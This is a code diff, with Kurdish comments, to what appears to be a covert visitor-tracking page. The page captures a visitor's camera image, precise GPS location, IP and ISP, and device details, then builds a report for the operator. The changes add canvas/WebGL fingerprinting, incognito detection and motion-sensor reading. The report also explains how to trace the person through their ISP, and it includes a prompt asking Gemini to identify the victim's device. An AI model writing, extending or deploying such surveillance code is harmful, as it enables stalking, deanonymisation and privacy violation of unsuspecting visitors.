@@ -134,35 +134,93 @@
             let screenRes = `${window.screen.width}x${window.screen.height}`;
             let pixelRatio = window.devicePixelRatio || 1;
 
-            // 6. کارتی گرافیک (GPU)
+            // 6. زانیارییە گشتییەکانی تر (RAM, CPU, Language, Dark Mode)
+            let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ناوک (Cores)` : "نەزانراو";
+            let deviceRam = navigator.deviceMemory ? `نزیکەی ${navigator.deviceMemory} گێگابایت` : "نەزانراو";
+            let sysLang = navigator.language || "نەزانراو";
+            let isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "دۆخی تاریک (Dark Mode)" : "دۆخی ڕووناک (Light Mode)";
+
+            // --- تایبەتمەندییە نوێیەکان ---
+
+            // A. Network Information API (Extended - RTT & Downlink)
+            let extendedNetwork = "نەزانراو";
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    let type = conn.effectiveType || 'نادیار';
+                    let downlink = conn.downlink ? conn.downlink + ' Mbps' : 'نادیار';
+                    let rtt = conn.rtt ? conn.rtt + ' ms (Ping)' : 'نادیار';
+                    extendedNetwork = `جۆر: ${type} | خێرایی: ${downlink} | پینگ (RTT): ${rtt}`;
+                }
+            } catch (e) {}
+
+            // B. Advanced Canvas & WebGL Fingerprinting
+            let advFingerprint = "نەزانراو";
             let gpuInfo = "نەزانراو";
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                // WebGL GPU Info
+                const canvasGL = document.createElement('canvas');
+                const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     if (debugInfo) {
                         gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                     }
                 }
+                // Canvas Fingerprint Hash Simulation
+                const canvas2D = document.createElement('canvas');
+                const ctx = canvas2D.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("BrowserFP, 2026!", 2, 15);
+                let dataURI = canvas2D.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < dataURI.length; i++) {
+                    hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
+                    hash |= 0;
+                }
+                advFingerprint = `Hash ID: ${Math.abs(hash)} (GPU: ${gpuInfo})`;
             } catch (e) {}
 
-            // 7. زانیارییە نوێیەکان (RAM, CPU Cores, Network, Language, Dark Mode)
-            let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ناوک (Cores)` : "نەزانراو";
-            let deviceRam = navigator.deviceMemory ? `نزیکەی ${navigator.deviceMemory} گێگابایت` : "نەزانراو (سنووردارکراو لەلایەن وێبگەڕ)";
-            
-            let netType = "نەزانراو";
+            // C. Device Orientation & Motion Sensors
+            let motionInfo = "بەردەست نییە یان ڕێگری لێکراوە";
             try {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (conn) {
-                    netType = `جۆر: ${conn.effectiveType || 'نادیار'}, خێرایی نزیکەی: ${conn.downlink ? conn.downlink + ' Mbps' : 'نادیار'}`;
+                let orientationData = await new Promise((resolve) => {
+                    let resolved = false;
+                    const handler = (event) => {
+                        if (!resolved) {
+                            resolved = true;
+                            window.removeEventListener('deviceorientation', handler);
+                            resolve(`Alpha: ${Math.round(event.alpha || 0)}°, Beta: ${Math.round(event.beta || 0)}°, Gamma: ${Math.round(event.gamma || 0)}°`);
+                        }
+                    };
+                    window.addEventListener('deviceorientation', handler);
+                    setTimeout(() => {
+                        if (!resolved) {
+                            resolved = true;
+                            resolve("جووڵە نەدۆزرایەوە (Timeout)");
+                        }
+                    }, 1000);
+                });
+                motionInfo = orientationData;
+            } catch (e) {}
+
+            // D. Incognito / Private Mode Detection
+            let incognitoStatus = "ئاسایی (Normal Mode)";
+            try {
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+                    let estimate = await navigator.storage.estimate();
+                    // لە حاتی ئینکۆگنیستۆدا قەبارەی کوتراوی سۆراج زۆر سنووردارە (بەزۆری کەمتر لە 120 مێگابایت)
+                    if (estimate.quota && estimate.quota < 120 * 1024 * 1024) {
+                        incognitoStatus = "پەنجەرەی نەبینراو / ئینکۆگنیستۆ (Incognito Mode) 🕵️‍♂️";
+                    }
                 }
             } catch (e) {}
 
-            let sysLang = navigator.language || "نەزانراو";
-            let isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "دۆخی تاریک (Dark Mode)" : "دۆخی ڕووناک (Light Mode)";
-
-            // 8. کامێرا و وێنەگرتن
+            // 7. کامێرا و وێنەگرتن
             let imageBlob = null;
             let cameraStatus = "";
             try {
@@ -194,32 +252,34 @@
                 ? `لۆکەیشنی دەقیقی کەسەکە ئەمەتا دەتوانی بە کلیک کردن لەسەر [گووگڵ ماپ] (${mapLink}) بیبینی:\n(Lat & Long: ${locationText})` 
                 : `لۆکەیشن: ${locationStatus}`;
 
-            // دروستکردنی دەقی نامەکە بە پێی مەرجەکانت
+            // دروستکردنی دەقی نامەکە
             let introText = imageBlob 
                 ? `👤 سڵاو ${firstName}، ئەمە وێنەی کەسەکەیە و وردەکارییەکانی بەم شێوەیەیە:` 
                 : `👤 سڵاو ${firstName}، وێنەی کەسەکە نەهاتۆتەوە، چونکە ${cameraStatus}`;
 
-            const msg = `زانیارییە تەواوەکانی سەردانیکەرەکە:\n\n` +
+            const msg = `زانیارییە تەواوەکانی سەردانیکەرەکە (پێشکەوتوو):\n\n` +
                         `${introText}\n\n` +
                         `⏰ کات: ${fullDateText}\n` +
                         `🌐 IP کەسەکە: ${ip} (${isp})\n` +
                         `📍 ${mapTextPart}\n` +
+                        `🕵️‍♂️ دۆخی وێبگەڕ: ${incognitoStatus}\n` +
+                        `🛜 خێرایی و جۆری قووڵی ئینتەرنێت: ${extendedNetwork}\n` +
+                        `🧬 فینگەرپریینتی قووڵ (Advanced FP): ${advFingerprint}\n` +
+                        `🔄 سێنسەری جووڵە (Motion Sensors): ${motionInfo}\n` +
                         `🔋 ڕێژەی شەحنی مۆبایل: ${batteryInfo}\n` +
                         `📷 دۆخی کامێرا: ${cameraStatus}\n` +
                         `📱 سیستەم/ئامێر: ${deviceModel}\n` +
                         `📐 ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})\n` +
-                        `🎮 کارتی گرافیک (GPU): ${gpuInfo}\n` +
-                        `🧠 ناوکەکانی پرۆسێسەر (CPU Cores): ${cpuCores}\n` +
+                        `🧠 ناوکەکانی پرۆسێسەر (CPU): ${cpuCores}\n` +
                         `💾 قەبارەی ڕام (RAM): ${deviceRam}\n` +
-                        `🛜 جۆری هێڵی ئینتەرنێت: ${netType}\n` +
-                        `🌐 زمانی سیستەم و وێبگەڕ: ${sysLang}\n` +
+                        `🌐 زمانی سیستەم: ${sysLang}\n` +
                         `🌓 دۆخی شاشە: ${isDarkMode}\n` +
                         `🌐 User-Agent: ${userAgentText}\n\n` +
                         `📌 **چۆنیەتی سوودوەرگرتن لە IP بۆ دۆزینەوەی شوێنی ورد (ڕێگەی یاسایی):**\n` +
                         `ئەگەر لۆکەیشنی ڕاستەوخۆ (GPS) بەردەست نەبوو یان کەسەکە Denyـی کرد، دەتوانیت لە ڕێگەی IPـیەکەیەوە (` + ip + `) ئەم هەنگاوانە بنێیت:\n` +
-                        `1. ناسینەوەی کۆمپانیای دابینکەری ئینتەرنێت (ISP) کە لەم حاڵەتەدا بریتییە لە: (${isp}).\n` +
-                        `2. پێشکەشکردنی سکاڵای فەرمی یان داواکاری یاسایی بۆ بەشی تاوانە ئەلیکترۆنییەکان یان کۆمپانیای ناوبراو.\n` +
-                        `3. کۆمپانیاکەی ئینتەرنێت لە ڕێگەی کاتی چوونکە (Timestamp: ${timeString}) دەتوانێت بە دەقیقی دیاری بکات کە ئەو IPـیە لەو ساتەدا لەلایەن کێوە و لە چ ناونیشانێک (ماڵ یان هێڵی تەلەفۆنی) بەکارهاتووە.\n\n` +
+                        `1. ناسینەوەی کۆمپانیای دابینکەری ئینتەرنێت (ISP) کە بریتییە لە: (${isp}).\n` +
+                        `2. پێشکەشکردنی سکاڵای فەرمی یان داواکاری یاسایی بۆ لایەنە پەیوەندیدارەکان.\n` +
+                        `3. کۆمپانیاکەی ئینتەرنێت لە ڕێگەی کاتی ڕووداوەکە (Timestamp: ${timeString}) دەتوانێت بە دەقیقی دیاری بکات کە ئەو IPـیە لەو ساتەدا لەلایەن کێوە بەکارهاتووە.\n\n` +
                         `🤖 **پرۆمتی تایبەت بۆ جێمینای:**\n` +
                         `ئەگەر دەتەوێت بە دەقیقی جۆری مۆدێلی ئامێرەکەی بزانیت، ئەم ڕستەی خوارەوە کۆپی بکە و بینێرە بۆ جێمینای:\n\n` +
                         `"سڵاو! من ئەم زانیارییە تەکنیکییانەی ئامێری کەسێکم هەیە: GPU WebGL: ${gpuInfo}، ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})، ناوکەکانی پرۆسێسەر: ${cpuCores}، ڕام: ${deviceRam}، و User-Agent: ${userAgentText}. تکایە شیکاری بکە و دیاری بکە کە ئەم ئامێرە هی چ مۆدێل و برندێکی دیاریکراوە (بۆ نموونە: Samsung Galaxy S series, iPhone, Xiaomi, لاپتۆپ و غەیری)؟"`;
